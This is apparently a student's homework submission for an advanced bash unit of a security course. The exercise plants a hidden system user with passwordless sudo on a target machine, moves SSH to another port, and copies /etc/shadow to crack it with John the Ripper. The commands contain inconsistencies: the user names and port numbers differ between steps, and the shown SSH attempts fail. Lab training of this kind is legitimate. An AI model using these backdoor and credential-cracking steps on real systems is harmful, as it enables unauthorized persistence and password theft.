## Submission for Unit 6 Advanced Bash Homework

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- sudo adduser sysad


Give your secret user a password.
- sudo passwd sysd

Give your secret user a system UID < 1000.
- usermod -u 999 sysd

Give your secret user the same GID
- `groupmod -g 999 sysd

Give your secret user full sudo access without the need for a password.
- sudo usermod -aG sudo sysd

Test that sudo access works without your password

```bash
sysd ALL=(ALL) NOPASSWD:ALL 
```

## Allow ssh access over port 2222.

Command to edit the `sshd_config` file:

```bash
#Formally Port 22
Port 222
```

Command to restart the ssh service:
- sudo service ssh restart 

Exit the root accout:
- exit 

SSH to the target machine using your `sysd` account and port 2222:
- 
With Target machine powered off
On Attacker machine typed `ssh sysd@192.168.6.105 -p 2222
message displayed: No route to host 

With target machine powered on 
On Attacker machine typed `ssh sysd@192.168.6.105 -p 2222
message displayed: Connection refused 

Use sudo to switch to the root user
- `sudo su

## Crack _all_ the passwords

Ssh back to the system using your sysd account
- `YOUR SOLUTION COMMAND HERE`

- Use John to crack the entire /etc/shadow file
    - cp /etc/shadow /etc/shadowcopy

nano shadowcopy and line up the passwd strings 

then sudo john shadowcopy 
sudo john -show passwd shadowcopy  
